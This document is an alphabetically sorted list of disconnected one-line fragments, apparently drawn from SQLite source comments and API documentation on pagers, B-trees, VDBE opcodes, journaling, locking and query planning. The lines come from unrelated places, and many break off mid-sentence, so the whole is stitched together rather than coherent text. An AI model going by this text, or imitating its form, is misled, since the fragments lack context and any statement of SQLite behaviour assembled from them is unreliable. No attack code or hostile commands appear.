 that opcode will always set the p2 value to 2 or more or else fail.
 that pDest points to.
 that page.  This leaves the right side of the tree somewhat
 that point to overflow pages. The pointer map entries for all these
 that processes text in UTF-8 encoding (CollSeq.xCmp) and another that
 that reference the table and converts them into opcodes that
 that represents the
 that structure.
 that syncs and fullsyncs are occuring at the right times.
 that takes advantage of the fact that the memory cell value is
 that the YYYY-MM-DD is according to the Gregorian calendar.
 that the application must guarantee that the file-system file being 
 that the backup operation has failed and pass the backup operation handle 
 that the caller will keep calling incrVacuumStep() until
 that the correct busy-handler callback is invoked if required.
 that the current implementation happens to never call this routine
 that the cursor has Cursor.eState==CURSOR_VALID.
 that the cursor is already where it needs to be and returns without
 that the database is corrupt.
 that the datatype of the PRIMARY KEY must be INTEGER for this field to
 that the file can be read.
 that the library can read.
 that the new child-page now contains pointers to are updated. The
 that the new entry was successfully appended.
 that the original pages since the original pages will be in the
 that the other VMs must complete first.
 that the page is either dirty or still matches the calculated page-hash.
 that the prepared statement is using a full table scan rather than
 that the prior pointer points to will have been modified.  Other kinds
 that the table is being renamed to.
 that there is no possibility of transforming the OR clause into an
 that this is required.
 that this part of the journal was being filled but has not yet been
 that this really is an auto-vacuum capable database.
 that this variable points to is held in memory obtained from 
 that use SQLite in a single thread.  The routines defined
 that uses encoding enc. The value returned indicates how well the
 that value so make a wild guess. 
 that was cast to a (const char 
 that was in effect at the time they were opened.
 that was open at the beginning of this operation will result
 that was passed as the third argument when the collation sequence was
 that was returned from [sqlite3_prepare_v2()] or one of its variants)
 that was started by a prior call to sqlite3GenerateConstraintChecks.
 that we do not. 
 that we have taken it all out and gone back to using simple
 that we will be able to handle recursive calls into
 that will be implicitly filled in by the OS).
 that wrote to this database was operating in persistent-journal
 the 
 the ((void
 the (CellInfo.nSize) value found by doing a full parse of the
 the 2nd parameter of the sqlite3_result_text
 the <op> using a bitmask encoding defined by WO_xxx below.  The
 the AFTER triggers
 the API.  So the redefinition macros are only valid if the
 the BtShared object.
 the CREATE TABLE or CREATE INDEX statement is replaced with the third
 the FROM clause 
 the FROM clause -- which tables to scan 
 the FROM clause of a select.  (INSERT and UPDATE statements are the
 the FROM clause of the SELECT statement.
 the FileChunk object will have a size that almost exactly fills
 the GLOB operator.
 the GROUP BY clause 
 the GROUP BY clause does not contain aggregate functions.
 the HAVING clause 
 the LEFT OUTER JOIN processing logic that this term is part of the
 the LockFileEx() API.
 the LockFileEx() API.  But we can still statically link against that
 the MACRO form does).
 the MSVC 64-bit compiler which this attempts to avoid.
 the MakeRecord instruction.  (See the MakeRecord opcode for additional
 the ON or USING clauses of a join disqualifies the expression
 the OP_Column opcode can decode the record later.
 the OP_MakeRecord opcode of the VDBE and is disassembled by the
 the OR clause.
 the OR-to-IN transformation in exprAnalyzeOrTerm(). It is not helpful
 the ORDER BY clause 
 the ORDER BY clause covers every term of the result set.  Add
 the ORDER BY clause is all ASC.
 the P3 record (the P3 record is a prefix of the P1 record).
 the P4_KEYINFO and P2 parameters later.  Neither the KeyInfo nor
 the PENDING_LOCK byte is temporary.
 the PGHDR_NEED_SYNC flag will not be set. It could then potentially
 the RELEASE call below can never fail.
 the RESERVED lock and have a journal open at the sqlite3OsAccess()
 the RESERVED_LOCK byte.
 the RowSet has allocated over its lifetime.  This routine is
 the SELECT statement pSelect.  If any term is reference to a
 the SQL function is running.
 the SQL function that supplied the [sqlite3_value
 the SQL statement comes from an external source.
 the SQL statement is of the form:
 the SQLITE_CONFIG_PAGECACHE mechanism.
 the SQLITE_MASTER table.  Note in particular that we must go ahead
 the SQLITE_OMIT_MEMORY_ALLOCATION which would cause the built-in
 the SQLite library at run-time.
 the SQLite library is in use. 
 the SQLite library will work on both POSIX and windows systems.
 the SQLite library.
 the SrcList.a[] array.
 the Table ures of all FROM-clause subqueries in a
 the Table.pVTable member variable of the corresponding Table object.
 the UTF-8 string contained in P4 is emitted on the trace callback.
 the VDBE cursor number of the table.  This routine just has to
 the VDBE implementing the pragma to expire. Most (all
 the VDBE program.
 the VDBE program.  But this routine can be called after much other
 the VDBE to do the work of the SQL statement.  VDBE programs are
 the VDBE-level file format changes.  The following macros define the
 the VM. More information may be found by calling [sqlite3_errmsg()].
 the Vdbe. In these cases we can just copy the pointer.
 the WHERE clause 
 the WHERE clause of SQL statements.  This module is responsible for
 the WHERE clause to be analyzed 
 the WO_ and SQLITE_INDEX_CONSTRAINT_ codes are identical.  The
 the WO_xx operator codes specified by the op parameter.
 the WhereClause.a[] array.  The slot[] array grows as needed to contain
 the [sqlite3] object prior to attempting to close the object.
 the [sqlite3_bind_blob 
 the [sqlite3_busy_handler 
 the [sqlite3_file] can safely store a pointer to the
 the [temp_store_directory pragma] always assumes that any string
 the access attempt or NULL if this access attempt is directly from
 the actual number of bytes of randomness obtained.
 the address of the next instruction to be coded.
 the aggregate SQL function is running.
 the already allocated buffer instead of allocating a new one.
 the amalgamation - so that subsequent files do not see isView as a
 the analysis to be used when preparing all subsequent queries.
 the application) the PRNG is seeded using randomness obtained
 the application-defined function is running.
 the application-defined function to be a BLOB containing all zero
 the application-defined function to be a copy the
 the application.  The default configuration is recommended for most
 the appropriate thing to do.  {H17086} The sqlite3_mutex_notheld()
 the authorizer callback may be passed.
 the authorizer will fail with an error message.
 the available payload.
 the b-tree if possible. If the cursor is left pointing to the last
 the bitmap becomes dense with high cardinality.  The algorithm needs
 the bitmask for all FROM clause terms to the left of the N-th term
 the bitmasks together.
 the blob as P4. This opcode is transformed to an OP_Blob
 the body of a TRIGGER.  The purpose of such selects is to call
 the btree layer.
 the build-in LIKE operator.  The first argument to the function is the
 the build-in random() and randomblob() SQL functions.  This interface allows
 the busy callback if the lock is currently not available. Repeat
 the cache and reset the Pager structure internal state. If there is
 the cache may be internally inconsistent (not contain valid trees) so
 the cache with pBtree.
 the cached buffer should be returned with its contents intact. If the
 the call above. 
 the call for every page that comes in for re-initing. 
 the call to PagerPagecount() can be removed.
 the call worked.  The [sqlite3_config()] interface will return a
 the call worked.  The [sqlite3_db_config()] interface will return a
 the caller already has at least a read-only transaction open
 the caller is assumed to have an open write transaction.
 the caller specifies a buffer size for an in-memory buffer to
 the caller. This should be sqlite3_vfs.mxPathname
 the calling application should call [sqlite3_free()] on any error
 the calling function (pcache.c) will never have a createFlag of 1 on
 the calling procedure is finished using it.
 the calling routine.
 the case that if X is the bitmask for the N-th FROM clause term then
 the case where the source and destination databases have the
 the cell content has been copied someplace else.  This routine just
 the cell size drop below the min embedded payload fraction.
 the cell-content area. If this is greater than the usable-size
 the chain.  Otherwise the !p->locked test above would have failed 
 the child Expr objects in the Expr.pLeft and Expr.pRight subtrees
 the code generator needs.  We have to keep per-table autoincrement
 the collating sequence for each expression in that expression list.
 the collation sequence name. A pointer to this string is stored in
 the collation.  The destructor is called when the collation is
 the column currently under construction.
 the column has no default collating sequence.
 the column that is that key.   Otherwise Table.iPKey is negative.  Note
 the column will ever be used by the optimizer.  Note that using the
 the column.
 the columns of the view in the pTable structure.  Return the number
 the common case of small integers.
 the comparison for use by the next OP_Jump instruct.
 the comparison in pExpr.
 the complete WHERE clause 
 the compound have been resolved.
 the connection is closed.)  If zFilename is NULL then the database
 the constraint problem so INSERT OR REPLACE will always change
 the content before returning.
 the content of a cursor structure to suit its own needs.
 the content of register P3 is greater than or equal to the content of
 the content of register P3 is greater than the content of
 the content of register P3 is less than or equal to the content of
 the content of the page at this time.  So do not go to the disk
 the contents of the pager-cache. If a transaction was active when
 the contents to the temporary database.
 the context containing the match is incremented.
 the copy. The copy of the Table structure is deleted by tokenize.c
 the correct order to satisfy the ORDER BY clause so that no separate
 the corresponding bit in mask is clear.  Auxdata entries beyond 31
 the cost by NlogN to cover the expense of sorting. 
 the current contents to sContext.s so in case the user-function
 the current cursor position.
 the current default journal mode (which may be different to
 the current default locking mode (which may be different to
 the current row
 the cursor before the new key can be inserted.
 the cursor number for the original outer query FROM element in
 the cursor to the largest entry in the tree that is smaller than
 the cursor would have been INVALID above and this for(
 the cursor.  Hence the following sqlite3VdbeCursorMoveto() call is always
 the dallocation is deferred until the column cache line that uses
 the data just read from the sub-journal. Mark the page as dirty
 the database against which the compiled query is actually executed.
 the database being opened will be more than pVfs.mxPathname
 the database but rather the symbolic name of the database that
 the database can be restored to its original state by playing back
 the database connection is closed.  Future versions of SQLite might
 the database connection that invoked the authorizer callback.
 the database connection that invoked the callback.  Any actions
 the database connection that invoked the progress handler.
 the database connection that invoked the update hook.  Any actions
 the database file and clear the error state. If this means that
 the database file has been corrupted externally.
 the database file header. The incr-vacuum-flag field is located at
 the database file or the portion of the rollback journal and 
 the database file should be truncated to during the commit process.
 the database file synced.
 the database file.
 the database file. If a savepoint transaction were rolled back after
 the database handle that malloc() has failed and return NULL.
 the database has not yet been created.
 the database is either not an in-memory database or it is
 the database is stored in memory (and is thus forgotten as soon as
 the database page cache with the default page cache implemenation.  
 the database page that contains the pending byte.  It never attempts
 the database schema. 
 the database.
 the db.mallocFailed flag so that higher-level functions can detect it.
 the default file format for new databases and the maximum file format
 the default implementation into the sqlite3Config structure.
 the default.
 the default.  The choice for the new VFS is arbitrary.
 the desired setting of the [SQLITE_THREADSAFE] macro.
 the destination is an in-memory database with a different page size
 the destination table (template 3).
 the destructor for the RowSet.
 the destructor will be called before the metadata is dropped.
 the disconnect is deferred until all locks have been removed.
 the dropCell() routine will overwrite the entire cell with zeroes.
 the encoding of the Mem adjusted. This routine does not do any
 the end of the index key pointed to by cursor P1.  This integer should be
 the end of the new file instead.
 the end of the page.  Pointers to the cells are in the cell pointer array
 the end.
 the end. Hence these functions allow the caller to handle the
 the entire cell by checking for the cases where the record is
 the entire contents of the master journal file. This could be
 the entire master journal file. The case pSavepoint==NULL occurs when
 the entire-list will be searched for that page.
 the entry being deleted. This cell will replace the cell being deleted
 the entry for the overflow page into the pointer map.
 the entry that needs indexing.
 the ephermeral table call VUpdate.
 the error code is SQLITE_ERROR.  A subsequent call to sqlite3_result_error()
 the error code is returned to the caller and the contents of the
 the error message.
 the error state error code is returned. It is permitted to read the
 the error.
 the evaluator loop.  So we can leave it out when NDEBUG is defined.
 the file format becomes 3.
 the file-system for the given pager. A hot journal is one that
 the file-system using sqlite3OsDelete().
 the filtered result set is empty.
 the first N serialized values exactly match the N serialised values
 the first argument to register for a callback that will be invoked
 the first argument to the sqlite3_prepare() that was used to create
 the first argument.
 the first byte with bit 8 clear.  The most significant byte of the integer
 the first entry.  TRUE is also returned if the table is empty.
 the first journal header seen and continuing until the effective end
 the first of several action routines that get called in response
 the first parameter. Note that the order of the
 the first step of the trigger-program.
 the first three statements in the compareInfo structure.  The
 the first time it is executed.
 the first time sqlite3_initialize() is invoked during the lifetime of
 the first time the virtual table is used in an SQL statement. This
 the first time this routine is called.  The seed value does
 the first two bytes past the cell pointer area since presumably this
 the flags argument to [sqlite3_open_v2()].  Or if [sqlite3_open()]
 the following flags must be set to determine the memory management
 the following macro.
 the following page matches iPage.
 the following structure 
 the freelist.
 the freelist.  So we do need to check for corruption while scanning
 the from-table is created.  The existence of the to-table is not checked.
 the function or aggregate.
 the function result.
 the global doubly-linked list.  The contents of the bucket are the
 the handler callback is the number of times that the busy handler has
 the handler returns 0 which causes [sqlite3_step()] to return
 the hash of the key modulo hash table size 
 the hash table 
 the hash table.
 the header comment on that routine for additional information.
 the header of pKey1 is ignored.  It is assumed that pKey1 is
 the iStart value would be 0.  The result then would
 the implementation is not required to do anything special with this
 the implementation most closely matches the way in which the
 the implementation of the [virtual table module].   The fourth
 the index already exists and must be cleared before being refilled and
 the index hash table and free all memory structures associated
 the index into IDLIST of the primary key column.  keyColumn is
 the index named P4 in database P1.  This is called after an index
 the index of that memory cell. The code that
 the index.
 the information we've collected.
 the information we've collected.  
 the input list.  But that is impossible.
 the integer column number.
 the integer cursor number of a VDBE cursor pointing to that table and
 the journal file here.
 the journal file or writing the very first journal-header of a
 the journal has already been synced.
 the journal is always stored in memory 
 the journal is empty.
 the journal needs to be sync()ed before database page pDbPage.pgno
 the journal needs to be sync()ed before database page pPg.pgno
 the journal-mode of the main database).
 the journal.  Then the contents of the journal are flushed out to
 the key for the current entry.  If the cursor is not pointing
 the key if skipKey==null and it points to the beginning of data if
 the key of an index.  A blob encoding of a record is created by
 the key string in pUnpacked.  Write into 
 the key/data and copy it into a preallocated buffer.
 the label into the resolved address.
 the largest cell index.
 the last (right-most) SELECT in the series may have an ORDER BY or LIMIT.
 the last one in the database) then a zero is stored in register P2.
 the last statement) and is used to update sqlite_lsChange.
 the left hand side of a comparison overrides any collation sequence
 the left operand of infix functions (the operand we want to
 the left.  Thus entry 0 contains the join operator for the join between
 the library (perhaps it is unable to allocate a needed resource such
 the library with -DSQLITE_OMIT_AUTHORIZATION=1
 the list that is large enough to accomadate it.
 the local value does not make changes to the disk file and the
 the local value does not make changes to the disk file and the default
 the locking-mode is set to the value specified.
 the locking-mode of the main database).
 the lookaside memory.
 the lookaside subsystem is stored on a linked list of LookasideSlot
 the macro again restores the address.
 the main database file and P1==1 is the database file used to store
 the main database has not been initialized and/or created when ATTACH
 the main database is read-only.  The transient or virtual
 the make process cause these values to align.  Assert()s in the code
 the mallocFailed flag in the connection pointer.
 the master journal name. This is in case the previous page written to
 the maximum number of record bytes stored on an index B-Tree
 the memory allocation routines built into SQLite.</dd>
 the memory is allocated anyway and the current operation proceeds.
 the memory location that is the accumulator for the aggregate.
 the memory that 
 the metadata when the corresponding function parameter changes
 the minor token.  The fourth optional argument is whatever the
 the mkopcodeh.awk script for additional information.
 the more severe [SQLITE_IOERR_BLOCKED].  This error code promotion
 the more specific error code is returned directly by sqlite3_step().
 the mutex is released if any kind of error occurs.
 the mutex routines built into SQLite.</dd>
 the name context cannot be NULL. 
 the name is passed as the second function argument.
 the name of a master journal file that should be written into the
 the name specified as part of the [ATTACH] statement if the destination is
 the names are passed as UTF-16 in machine native byte order.
 the names of all columns.
 the near future and that SQLite should make its own private copy of
 the nearest second. The number of milliseconds of sleep actually
 the necessary byte swapping is carried out using a 64-bit integer
 the new child page does not match the flags field of the parent (i.e.
 the new column during parsing.
 the new data into the backup.
 the new data is returned and the hash table is unchanged.
 the new database connection should use.  If the fourth parameter is
 the new element.  Return a negative number if malloc fails.
 the new function is not good for anything by itself.  Its only
 the new page size (value of 
 the new record. The output register (pOp.p3) is not allowed to
 the new table (assuming an error did not occur). But we were
 the new table will match the result set of the SELECT.
 the next Next instruction will be a no-op.  Hence it is OK to delete
 the next page in the tree that has not yet been visited. The
 the nul-terminator bytes.
 the number of bytes in that string.
 the number of bytes up to the first zero terminator.
 the number of characters written would be a more useful return
 the number of columns in P2 can be computed at the same time
 the number of columns is stored in the VdbeCursor.nField element.
 the number of digits converted.
 the number of errors.
 the number of errors.  Leave any error messages in the pParse structure.
 the number of non-transaction savepoints currently in the
 the offset of the method to call in the sqlite3_module structure.
 the offset of the requested map entry.
 the old data for each record to be updated because some columns
 the one at index P2 from the beginning of
 the only difference between the two being that the sense of the
 the open of a journal file a no-op.  Writes to this journal would
 the opened blob.  The size of a blob may not be changed by this
 the operands in registers P1 and P3 are equal.
 the operands in registers P1 and P3 are not equal.  See the Lt opcode for
 the operation in progress stops and returns an error code.  But prior
 the order by clause is superfluous. 
 the order-by term is an identify that corresponds to the AS-name of
 the origin_ routines return the column name.
 the original statement text and an estimate of wall-clock time
 the other BtShared locks that we used to hold in ascending
 the other connections to use as the blocking connection.
 the other input is NULL.  A NULL and true or two NULLs give
 the output.
 the overflow list is page number (ovfl
 the pNext pointer.  The [sqlite3_vfs_register()]
 the pWC.a[] array.
 the page being freed as a leaf page of the first trunk in the free-list.
 the page has been added as a leaf of the freelist and so its
 the page is marked as needSync==0.
 the page number and the pPager.pageSize bytes of data for the page.
 the page object is not dropped.
 the page to the freelist.
 the page.
 the page. Return without further ado.  
 the pager to enter the error state. Which will be cleared by the
 the pages are written out to the database file in list order. Writing
 the pages involved in locking therefore.  SHARED_SIZE is selected so
 the parse is retried before an error is thrown.
 the parse tree for an expression and the span of input text for an
 the parser and down into all the parser action routine in order to
 the particular action to be authorized. The third through sixth parameters
 the parts beyond the common prefix are ignored.
 the payload area.
 the permutation used to determine if the next
 the persistent cache size value that is stored in the database
 the persistent journal and the journal file currently consumes more
 the pluggable module.  The SQLite core has no knowledge of
 the point where the name matched. 
 the pointer map needs to be updated for the subsequent overflow page.
 the pointer that was the pUserData parameter (the 5th parameter)
 the pointer to ctx.s so in case the user-function can use
 the pointer to the [database connection] (the 1st parameter)
 the pointer-map entries for each child page are updated so that the
 the possible values of meta[BTREE_TEXT_ENCODING-1].
 the potential journal header.
 the previously allocated size of the array.  initSize is the
 the prior execution is returned.
 the process that created this journal. If this journal was
 the program.
 the pseudo-table cursor may or may not make it's own copy of the
 the pseudo-table.
 the public domain.  The original comments are included here for
 the quote characters.  The conversion is done in-place.  If the
 the reason the mutex does not exist is because the build is not
 the reasoning here.  Delete the obsolete journal file under
 the record to 0. This tells code below to store a NULL
 the record.
 the register becomes stale.
 the register given by rMayHaveNull to NULL.  Calling routines will take
 the register number is returned without generating any code.
 the request. The allocation is made from the first free slot in
 the required virtual table implementations are registered.  
 the result code.  Write any error message text into pzErrMsg.
 the result is a copy of the cache register.
 the result is false whereas it would be true with IdxGT.
 the result set of that SELECT.
 the result.
 the resulting tab1 has much less fragmentation.
 the resulting time into the DateTime structure p.  Return 0
 the return value of this interface.
 the returned buffer to accumulate data.
 the returned data set are:
 the reuse of the same limit and offset registers across multiple
 the right size.  This is to guard against size changes that result
 the right-hand side of the corresponding aConstraint[] is evaluated
 the rollback journal (which causes the transaction to commit) and
 the rollback journal.  There are three levels:
 the rollback.  The rollback may have deleted tables
 the root page number of the index is taken from pIndex.tnum.
 the rootpage of the new table in register pParse.regRoot.  This is
 the routine expects pointers to 16-bit word aligned strings
 the routine should return 1.  {END} This seems counter-intuitive since
 the row of the virtual-table that the
 the rowid is computed automatically in an insert or that the rowid value
 the rowid is in VdbeCursor.iKey.
 the rowid of the table entry to which this index entry points.
 the rowids might change which will mess up indexing.
 the same as a no-op.  This opcodesnever appears in a real VM program.
 the same as the order of indices on the linked list of indices
 the same as the sqlite3_total_changes() API function.
 the same buffer is returned. The implementation of the aggregate can use
 the same connection. Only shared Btrees are on the list. 
 the same number of characters into the UTF-16 string.
 the same sqliteMalloc() as the one that allocates the database
 the same type number.
 the schema change.  Disaster would follow.
 the schema cookie.
 the schema to change multiple times and for the cookie to be
 the schema-version and the user-version are 32-bit signed integers
 the schema-version is potentially dangerous and may lead to program
 the second process to proceed.
 the select structure itself.
 the select.  The template is like this:
 the set contains no NULL values. This happens as the result
 the setSharedCacheTableLock() procedure) held by Btree handle p.
 the shared-btree). The btree layer manages reference counting issues.
 the shared-cache feature is enabled.
 the sibling-page assembled above only.
 the source database file. This lock is released before the
 the space used by the cell pointer.
 the specific parameter to measure.  Recognized integer codes
 the speed a little by numbering the values consecutively.
 the sqlite3.h file specify the version of SQLite with which
 the sqlite3VdbeChangeP4() function to change the value of the P4
 the sqlite3_bind_
 the sqlite3_changes() interface can be called to find the number of
 the sqlite3_compile() routine. The integer returned is an SQLITE_
 the sqlite3_index_info structure that is used to communicate with
 the sqlite3_index_info structure.
 the sqlite3_vtab object if successful.  
 the sqlite_master table.  We do not want to create it again.
 the standard C library.  The result is written into the
 the state it was in before we started making changes.
 the state of the cursor.  We have to invalidate the cursor
 the state transitions back to PAGER_UNLOCK.  The first time
 the statement in the first place.
 the statement journal format differs from the standard journal format
 the statement to update a single row.
 the step function was not previously called.
 the string and before returnning.  This routine is intended to be used
 the string is made into memory obtained from sqlite3Malloc().
 the string itself should be 15 characters long.  If you change
 the string to UTF-8 and then returns the number of bytes.
 the string will be valid and unchanged until xClose() is
 the string.
 the sub-journal if necessary.
 the sub-journal to zero bytes in size. 
 the subquery before this routine runs.
 the subtrees in Expr.x.pList or Expr.x.pSelect are always separately
 the switch statement will break with convention and be flush-left. Another
 the system is also considered to be deadlocked if connection B has
 the system malloc() and free() directly when converting
 the table and pick which records to delete.
 the table and the column that are being accessed.  The auth function
 the table being dropped. This is done before the table is dropped
 the table data structure from the hash table.  But it does destroy
 the table has a column of type [INTEGER PRIMARY KEY] then that column
 the table into which we are inserting 
 the table named P4 in database P1.  This is called after a table
 the table referred to.  pToCol is a list of tables in the other
 the table that contains the REFERENCES clause that creates the foreign
 the table zWhere. 
 the table.
 the table. The list is connected by Trigger.pNext pointers.
 the tables have indices and there are terms in the WHERE clause that
 the temp database.
 the temporary table iParm.
 the time of the first error and the call to these interfaces.
 the time the generated code is executed. This can be different from
 the total cost of performing operations with O(logN) or O(NlogN)
 the total number of pages cached by purgeable pager-caches to the sum
 the transaction is automatically rolled back.
 the transaction journal if it is not there already.
 the transaction opened by database db has just finished. Locks held
 the tree depth.  Root pages return 0.  Parents of root pages
 the tree or 2 to abort the tree walk.
 the trigger by name.  The sqlite3DropTriggerPtr() routine does the
 the trigger named P4 in database P1.  This is called after a trigger
 the type and parent page number to pEType and pPgno respectively.
 the type string.  
 the union of all rowids using a RowSet object.  This is similar
 the use of these functions.  To help encourage people to avoid
 the user deletes the collation sequence after the vdbe program is
 the user-function defined by pCtx.
 the usual way - using sqlite3ResolveExprNames().
 the value by passing it to sqlite3ValueFree() later on. If the expression
 the value now stored in the database file. If writing this
 the value of MEMDB will be a constant and the compiler will optimize
 the value of P2 itself.
 the value of nRec based on this assumption.
 the value of nRec computed from the file size would be too large.  For
 the value of the alias.  The value is stored in an auxiliary register
 the value of the createFlag argument.  0 means do not allocate a new
 the value of the integer into pNum.  If zNum is not an integer
 the value read from the database file.
 the value returned by sqlite3_column_type() is undefined.  Future
 the value returned by the xSectorSize() method rounded up to 512 if
 the value sets a specific directory to be used for temporary files.
 the value sets a specific file to be used for database access locks.
 the value with a register number for indices that are to be used
 the value.
 the values are compared. If both values are blobs then memcmp() is
 the values of columns in the new row.
 the vdbe program. Instead they are used to allocate space for
 the version that will require the least expensive encoding
 the virtual tables they implement.
 the way through and which will need to undo some writes without having to
 the where.c module.
 the write-transaction for this database file is to delete the journal.
 the wrong answer.  See ticket 
 the xAccess method of an [sqlite3_vfs] object. {END}  They determine
 the xCallback() function is called.  pArg becomes the first
 the xFileControl method.  {H11305} The return value of the xFileControl
 the xOpen method must set the sqlite3_file.pMethods to either
 the yy_shift_ofst[] array and YY_REDUCE_USE_DFLT is used in place of
 the zStmt variable
 the zero terminator.  So the longest string that can be completely
 then 
 then Expr.token contains the name of the function.
 then SQLite makes a copy of the result into space obtained from
 then WhereTerm.leftCursor and WhereTerm.u.leftColumn record the
 then a list of all columns for the table is substituted.  The IDLIST
 then a read lock is acquired as part of this instruction.  A read
 then an and attempt is made to write an error message into
 then an index may have been created on this column before the
 then any copies made by synthCollSeq() need to be invalidated.
 then back out all changes that have occurred during this execution of the
 then call pager_incr_changecounter() to update the change-counter
 then changed again within the statement.  When rolling back such a
 then convert that term into a copy of the corresponding result set
 then corruption may follow.
 then create a new virtual term like this:
 then create a transient table ure to describe the subquery.
 then data is pulled from srcTab and pEList is used only to get the
 then delete the journal file. See the header comment above for
 then expand the outer query to make space for it to hold all elements
 then fall thru.  The P1 cursor is left pointing at the matching entry
 then generate an error.
 then iTable is the address of a subroutine that computes the subquery.
 then it is not necessary to include the nul-terminator character
 then it is passed the names of undefined collation sequences as strings
 then jump to P2.  Otherwise fall through to the next instruction.
 then loop over the sorting index in order to get the output
 then only the currently executing statement is affected.
 then record a pointer to this table in the main database structure
 then reduce inMultipler 
 then remove them from the auxiliary database list.  We take the
 then return false.
 then return the number of bytes in the first nChar unicode characters
 then rewinding that index and playing it back from beginning to
 then rowid is stored for subsequent return by the
 then runs the new virtual machine.  It is thus a re-entrant opcode.
 then savepoint iSavepoint is also destroyed.
 then set aWc[0] through aWc[2] to the wildcard characters and
 then set iDb to 1 to create the trigger in the temporary database.
 then set the high-order bit of the bitmask.
 then sets the error code to SQLITE_TOOBIG
 then skip the right table to avoid a duplicate match 
 then sqlite3PagerWrite() is called on pDbPage and nByte bytes
 then sqlite3_get_auxdata() returns a NULL pointer.
 then the EP_DblQuoted flag is set on the expression node.
 then the KeyInfo structure is appropriate for initializing a virtual
 then the [sqlite3_prepare_v2()] or equivalent call that triggered
 then the appropriate action is performed.  There are five possible
 then the behavior is undefined.
 then the commit is converted into a rollback.
 then the connection error-code (the value returned by sqlite3_errcode())
 then the conversion is performed.  Otherwise no conversion occurs.
 then the cost is calculated in the usual way.
 then the cursor still points to that page. In this case the first
 then the encoding of the value may not have changed.
 then the index cannot satisfy the ORDER BY constraint.
 then the more specific [error codes] are returned directly
 then the name of the column is unspecified and may change from
 then the new callback replaces the old. If sqlite3_unlock_notify() is
 then the optimistic overflow chain processing in clearCell()
 then the page should be evicted from the cache. In this case SQLite 
 then the pager object page size is set to 
 then the results were placed in a sorter.  After the loop is terminated
 then the return value from sqlite3_complete16() will be non-zero
 then the table is stored in a file that is automatically deleted
 then the transaction will be downgraded to a read-only transaction
 then the value of the change counter is copied to the database handle
 then the value returned by [sqlite3_last_insert_rowid()] is
 then the value returned is the size of the journal file when it
 then there are not enough fields in the record to satisfy the
 then there is no distinction between protected and unprotected
 then there should be a single item on the stack.  Write this
 then this function just writes a journal header to the start of the
 then this interface returns a pointer to the first prepared statement
 then this loop only runs once.
 then this routine is not threadsafe.
 then this routine returns a non-zero [error code].
 then use pager_truncate to grow or shrink the file here.
 then used by the virtual table implementation to access real tables 
 then we will try to use that column as the rowid.  Set the Table.iPKey
 then write its number into pReg.  If the result register is not
 then write the current page to the statement journal.  Note that
 there are major feature enhancements that are forwards compatible
 there are outstanding database connections or memory allocations or
 there are reports that windows throws an expection
 there cannot be more than 31 buckets required by the merge sorter.
 there could not have been an error 
 there is a chance that the blocking connection will have already
 there is a high probability of damage)  Level 2 is the default.  There
 there is an abort request.
 there is no need to worry about syntax like
 there is no point in retrying the call to sqlite3_backup_step(). These 
 there is not much SQLite is going to be able to do.
 there is nothing more to do here 
 there may be gaps in the list.
 thereafter is unchanged as long as nRef>0.
 thereafter.
 thereafter.  It records whether the operating system is Win95
 therefore be no less than -9223372036854775807.
 these integer values as the second argument.
 these numbers are not part of the result table itself.  These
 these result codes are too coarse-grained.  They do not provide as
 these two features are available.
 they are reported back as [SQLITE_CANTOPEN] or
 they can be safely discarded.
 they cannot change the size of a blob.
 they intend to abandon the parse upon the first syntax error seen.
 they often do so without holding sqlite3.mutex.
 they will persist after the current sqlite3_exec() call returns.
 thing) is obtained in a two-step algorithm.
 things that make prepared statements obsolete.
 think that the table has one more column than it really
 third argument might also be [SQLITE_UTF16] to indicate that the routine
 third argument.
 third parameter.
 this amount.  The only way to reach the limit is with sqlite3_malloc() 
 this block would have to account for hidden column.
 this call is a no-op.
 this call or a previous invocation) would have detected corruption
 this circumstance cannot arise.
 this code can safely assume that nCellKey is 32-bits  
 this code only executes once.  Because for a non-constant
 this even if the open fails.  SQLite expects that the sqlite3_file.pMethods
 this fact in the pSrcList.a[].colUsed bitmask.  Column 0 causes
 this file.
 this function assumes the single-byte case has already been handled.
 this function is a no-op.
 this function returns [SQLITE_READONLY].
 this function verifies that this invariant is not violated. 
 this function.
 this function. The second parameter is either the name of the database
 this handle.
 this happens for a comment or white-space 
 this has the effect of zeroing all output parameters.
 this header information was factored out.
 this implementation is provided as an alternative.
 this index can be used for sorting. 
 this interface.
 this is a temporary table or db.init.busy==1.  When db.init.busy==1
 this is because of a racing condition between a delete and open call to the FS
 this is considered a 1 page file.
 this is happening as it is important that all members of such a
 this is happening we don't really care. The integrity of the
 this is important.
 this lock.  
 this makes it safe to access the sqlite3.pDisconnect list of any
 this many bytes.
 this means that the row change count will be incorrect.
 this memory location.  The sign of meta-value 2 determines the
 this object for every database file that it has open.  This structure
 this opcode must be present immediately before the opcode that
 this opcode.  Then this opcode was call OpenVirtual.  But
 this out as well.
 this page contains countable entries. Increment the entry counter
 this page has no children.  The zerodata flag means that this page carries
 this parameter.  The amount returned is the sum of the allocation
 this point in the code and fail to obtain its own EXCLUSIVE lock
 this requires some special handling.
 this routine allocates an additional nEq memory cells for internal
 this routine in the correct order.
 this routine is used to determine if the host is Win95/98/ME or
 this routine obtains the mutex associated with each BtShared structure
 this routine return an integer between 1 and N where N is the number of
 this routine returns SQLITE_OK.
 this routine returns.
 this routine sets up a loop that will iterate over all values of X.
 this routine unrefs the first page of the database file which
 this routine will be called automatically by key routines such as
 this routine.
 this routine.  sqlite3LocateCollSeq() invokes the collation factory
 this set of interface routines to access the parameter values on
 this structure is returned by the first half and passed
 this structure opaque.
 this structure.
 this structure.  Tokens are also used as part of an expression.
 this test.
 this verb acts like PRNG_RESET.
 this will be declared corrupt. This value is calculated based on a
 this would be 125. 
 this.aExt = aExt
 this:
 those functions are not available.  So we use only LockFile() and
 those obtained by the xMutexInit method. {H17003} The xMutexEnd()
 those references with expressions that resolve to the subquery FROM
 those tasks.
 thread at a time.  It is not safe to read or modify this variable
 thread that is currently running the database operation.  But it
 thread.
 thread.  Then while the initial invocation of this routine by X is
 threads may safely make multiple concurrent calls to sqlite3_backup_step().
 threads must block until the first thread finishes with the initialization.
 threadsafe.  Failure to heed these warnings can lead to unpredictable
 three arguments to the function come directly from a detach statement:
 three arguments to the function come directly from an attach statement:
 three columns in the table.  In the Index structure describing
 three input tokens have been successfully shifted.
 three nodes.  And so forth.
 three will be 0.
 through an intermediate state PENDING.   A PENDING lock prevents new
 through its operation list and change all values of P2 which match
 through meta[15] are available for use by higher layers.  Meta[0]
 through the backup procedure. If the source database is modified by an
 through the first zero character.
 through the loop.  The fire the after triggers.
 throughout the SQLite code must become constants instead.  The SQLITE_WSD
 ticket 
 time a (read or write) transaction was successfully concluded
